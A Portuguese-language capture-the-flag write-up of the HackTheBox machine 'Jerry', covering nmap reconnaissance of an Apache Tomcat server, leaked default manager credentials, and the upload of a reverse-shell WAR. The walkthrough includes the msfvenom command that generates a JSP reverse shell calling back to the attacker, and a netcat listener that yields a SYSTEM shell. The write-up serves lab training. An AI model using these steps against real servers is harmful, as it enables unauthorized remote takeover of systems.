# [](#intro)Introdução

Este vai ser o nosso último relatório do ano. Dessa forma, vamos enfrentar a caixa Jerry em [HackTheBox](https://app.hackthebox.com). Da imagem da máquina, parece ser uma máquina do Windows. Vamos começar!

# [](#level-description)Challenge description

Podemos ver a descrição da máquina. Vamos ver.

> Descrição
>
> Embora Jerry é uma das máquinas mais fáceis no Hack The Box, é realista como Apache Tomcat é muitas vezes encontrado exposto e configurado com credenciais comuns ou fracos.

Está bem! A máquina que nos foi dada está a executar o Apacha Tomcat com credenciais fracas.

# [](#approach)Aproxime-se da mentalidade

Como sempre, vamos manter a nossa mentalidade:

1. Compreender conceitos básicos
2. Compreender o problema
3. Criando um ataque
4. Resolvendo

No entanto, vale a pena notar que, para um teste de penetração real realista, podemos ajustar alguns dos nossos passos. Chamaremos o primeiro passo de "Recon", já que é onde vamos realizar o nosso reconhecimento.

## [](#mindset-step1)Passo 1 - Reconhecimento

Semelhante à compreensão de conceitos básicos, a parte de reconhecimento visa nos ajudar a reunir informações sobre nosso alvo, analisando o que temos sobre nossa disposição. Para um pentest de caixa preta, esta é a posição que estamos agora. Primeiro precisamos de informações sobre o nosso alvo: que portos estão abertos? Podemos investigar todos os serviços disponíveis? existe um serviço web (embora isso já seja respondido pela descrição CTF).

Vamos começar o reconhecimento com `nmap`. Eu gosto de iniciar meu mapeamento da rede com um simples `nmap`:

```bash
kaizen@celestial /tmp/htb $ sudo nmap $IP
Starting Nmap 7.94 ( https://nmap.org ) at 2023-12-31 12:29 UTC
Nmap scan report for 10.10.10.95
Host is up (0.16s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT     STATE SERVICE
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 19.35 seconds
```
Como podemos ver, há um serviço web em execução na porta 8080. Vamos rodar `nmap` novamente, mas agora analisando as informações desta porta. Também me pergunto se a porta 22 está aberta, mas o firewall do Windows está bloqueando nossos pings. Então, eu corri:

```bash
kaizen@celestial /tmp/htb $ sudo nmap $IP -p 22,8080 -sV -Pn
Starting Nmap 7.94 ( https://nmap.org ) at 2023-12-31 12:31 UTC
Nmap scan report for 10.10.10.95
Host is up (0.29s latency).

PORT     STATE    SERVICE VERSION
22/tcp   filtered ssh
8080/tcp open     http    Apache Tomcat/Coyote JSP engine 1.1

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.72 seconds
```
Está bem. Temos o nosso Apache Tomcat ali mesmo. A porta 22 parece estar filtrada, o que pode indicar uma firewall atrás dela. Vamos acessar o serviço web no `http://$IP:8080`.

<img src="../figs/tomcat-jerry-1.png" alt="tomcat homepage">

Parece que estamos hackeando alguém que acabou de instalar Apache Tomcat versão 7.0.88 nesta máquina. A primeira coisa que olha para os meus olhos é o botão "Status do Servidor". Vamos acedê-lo.


<img src="../figs/tomcat-jerry-2.png" alt="tomcat server status">

Recebemos uma data de boas informações. Primeiro, podemos ver que estamos rodando em um Windows Server 2012 R2 em uma arquitetura amd64. Também podemos ver que o nome do host é "JERRY". Como não há muito mais aqui, podemos continuar o nosso reconhecimento através do site manualmente. Após alguma escavação, encontramos o caminho relativo `/docs/appdev/deployment.html`, que leva a:

<img src="../figs/tomcat-jerry-3.png" alt="tomcat deploy docs">

Isto é interessante. Está nos dizendo que para implantar uma aplicação nesta versão, precisamos comprimi-la no formato Web Archive (WAR).

> Uma aplicação web é definida como uma hierarquia de diretórios e arquivos em um layout padrão. Tal hierarquia pode ser acessada em seu formulário "não embalado", onde cada diretório e arquivo existe no sistema de arquivos separadamente, ou em um formulário "embalado" conhecido como um arquivo Web ARchive, ou WAR. O formato anterior é mais útil durante o desenvolvimento, enquanto o último é usado quando você distribui seu aplicativo para ser instalado.
>
> Para facilitar a criação de um arquivo Web Application Archive no formato necessário, é conveniente organizar os arquivos "executáveis" de sua aplicação web (isto é, os arquivos que Tomcat realmente usa ao executar o seu aplicativo) na mesma organização que o próprio formato WAR.

Uma vez que os aplicativos podem ser implantados, podemos de alguma forma ser capazes de ver quais estão em execução ou já estão implantados nesta máquina. Ao procurá-lo, tropecei em uma caixa de alerta estilo login, ao tentar acessar o "manager Host". Como eu não sabia nenhuma credencial, simplesmente cliquei em cancelar nela, e então, como um erro, o servidor me guia aqui:

<img src="../figs/tomcat-jerry-5.png" alt="tomcat credential leak">

Então encontramos um par de credenciais que podem ser as necessárias para acessar o "Host Manager". As credenciais são `tomcat:s3cret`. Mesmo que nós os tenhamos encontrado, tentar acessar o "gerente Host" com eles nos dá uma resposta 403.

Após mais alguma investigação, encontramos esse caminho relativo `/manager/html/list`, que leva a esta página:

<img src="../figs/tomcat-jerry-4.png" alt="tomcat deploy list">

Parece que somos capazes de carregar um aplicativo diretamente para o servidor a partir do serviço web. Se este for o caso, então podemos ser capazes de obter uma shell reversa, implementando um aplicativo.

## [](#mindset-step2)Passo 2 - Compreender o problema

Parece que encontrámos o nosso reconhecimento. Vamos ver o que encontramos até agora:

1. Credenciais vazadas `tomcat:s3cret` em páginas de erro.
2. Aplicativo de implantação que aceita arquivos WAR.
3. Uma funcionalidade de upload dentro do serviço web.
4. Página Inacessível Host Manager, dando 403.

Talvez possamos pensar num vetor de ataque. Poderíamos investigar a página inacessível do Host Manager para ver se encontramos mais vetores. No entanto, depois de algumas tentativas básicas, não encontrei nada lá. O que me leva a pensar que a nossa entrada é através de uma concha inversa. Se conseguirmos implantar uma aplicação de shell reversa, talvez consigamos obter apoio no sistema.


## [](#mindset-step3)Passo 3 - Criando o ataque

Para essa tarefa, podemos usar `msfvenom`. Um simples Google Search "msfvenom war file" leva a [esta página](https://charlesreid1.com/wiki/MSFVenom). Podemos ver que há uma carga específica para Tomcat. Podemos gerar nossa carga útil com:
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<YOUR IP> LPORT=1234 -f war > shell.war
```
Isso criará um arquivo `shell.war` que será nosso aplicativo de shell revse. Depois disso, enviamos esta shell para o servidor web:

<img src="../figs/tomcat-jerry-6.png" alt="tomcat deploy list">

Se tiver sucesso, vamos ver uma mensagem "OK" no topo da página, em "Tomcat Web Application Manager". Agora, precisamos começar a ouvir na porta 1234 (ou a porta escolhida como carga útil para msfvenom) em nossa máquina local com ```nc -lnvp 1234``.

Agora, nós simplesmente acessar `/shell/`, ou o nome do arquivo WAR aplicativo (sem .war), e teremos acesso à máquina através do netcat:

```bash
kaizen@celestial /tmp/htb $ nc -lnvp 1234
Connection from 10.10.10.95:49192
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\apache-tomcat-7.0.88>whoami
whoami
nt authority\system

C:\apache-tomcat-7.0.88>
```
Não só temos acesso à máquina, mas também estamos conectados como Administrador do Windows!

# [](#conclusions)Conclusão

Neste CTF, adotamos uma abordagem diferente, começando com reconhecimento completo, e, em seguida, ganhando uma posição no sistema. Exploramos uma vulnerabilidade de upload de arquivo Apache Tomcat, que nos forneceu uma shell reversa como administrador do Windows.

Com um bom reconhecimento, encontrar sua entrada tornou-se trivial neste CTF!
